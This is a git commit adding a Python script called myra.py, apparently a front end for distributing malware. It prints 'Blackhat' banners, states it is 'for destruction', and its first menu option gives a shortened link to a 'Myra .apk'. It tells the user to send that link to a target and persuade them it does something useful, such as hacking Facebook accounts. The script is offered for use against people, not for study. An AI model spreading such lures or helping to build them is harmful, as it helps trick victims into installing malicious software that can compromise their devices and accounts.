0e9c984a4cc8493600a133fb4fd599900bd3d2c3
Anoncomrade993 <103435041+Anoncomrade993@users.noreply.github.com>
2022-04-11 15:03:22 +0100

    Create myra.py

---
+++ myra.py
@@ -0,0 +1,80 @@
+import time
+import os
+from time import sleep
+import sys
+from colorama import Fore
+x = """
+  _ __ ___    _   _   _ __    __ _
+ | '_ ` _ \  | | | | | '__|  / _` |
+ | | | | | | | |_| | | |    | (_| |
+ |_| |_| |_|  \__, | |_|     \__,_|
+              |___/
+"""
+print(Fore.CYAN+x)
+print(Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+print(Fore.YELLOW+"🔰🔰Blackhat🔰🔰")
+print(Fore.GREEN+"so this is not for educational purpose 😒😒...its for destruction")
+print(Fore.WHITE+"🚬Operation No Mercy🚬")
+print(Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+print(Fore.WHITE+"@anonComrade_")
+a = Fore.YELLOW+"[1]"
+b = Fore.YELLOW+"[2]"
+c = Fore.YELLOW+"[3]"
+d = Fore.YELLOW+"[4]"
+print(a+""+Fore.WHITE+"Myra .apk")
+print(b+""+Fore.WHITE+"Myra .exe")
+print(c+""+Fore.GREEN+"@Contact Me")
+print(d+""+Fore.RED+"**EXIT**")
+x =int(input(Fore.GREEN+"~"+Fore.WHITE+"$"+Fore.CYAN+" choose :"))
+if x == 1:
+  words ="""
+▓▓▓▓▓▓▓▓
+▓▓▓▓▓▓▓
+▓▓▓▓▓▓
+▓▓▓▓▓
+▓▓▓▓
+▓▓▓
+▓▓
+▓
+▓▓
+▓▓▓
+▓▓▓▓
+▓▓▓▓▓
+▓▓▓▓▓▓
+▓▓▓▓▓▓
+▓▓▓▓▓▓▓▓
+\n"""
+  for char in words:
+    sleep(0.1)
+    sys.stdout.write(Fore.RED+char)
+    sys.stdout.flush()
+  print(Fore.YELLOW+"copy the link below to target,persuade him or her of whatever it seems to do for them E.G for hacking fb accts ")
+  load = """
+██
+████
+██████
+████████
+"""
+  for char in load:
+     sleep(0.1)
+     sys.stdout.write(char)
+     sys.stdout.flush()
+  print(Fore.RED+"=================================")
+  print(Fore.YELLOW+"👉LINK :👇"+"\n")
+  print(Fore.CYAN+" https://tinyurl.com/yckj37nx")
+  print(Fore.RED+"=================================")
+elif x == 2:
+   print(Fore.YELLOW+"============================")
+   print(Fore.RED+"not yet available now...buh always keep in check 🤘🤘")
+   print(Fore.YELLOW+"============================")
+elif x == 3 :
+      print(Fore.RED+"""[]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![]""")
+      print(Fore.WHITE+"Contact👇👇")
+      print(Fore.CYAN+"https://facebook.com/shadow_")
+      print(Fore.RED+"""[]!!!!!!!!!!!!!!!!!!!!!!!!!![]""")
+elif x == 4 :
+     os.system("clear")
+else :
+  print(Fore.RED+"[]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![]")
+  print(Fore.YELLOW+"[!]INVALID CHOICE 🤔🙄[!]")
+  print(Fore.RED+"[]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![]")
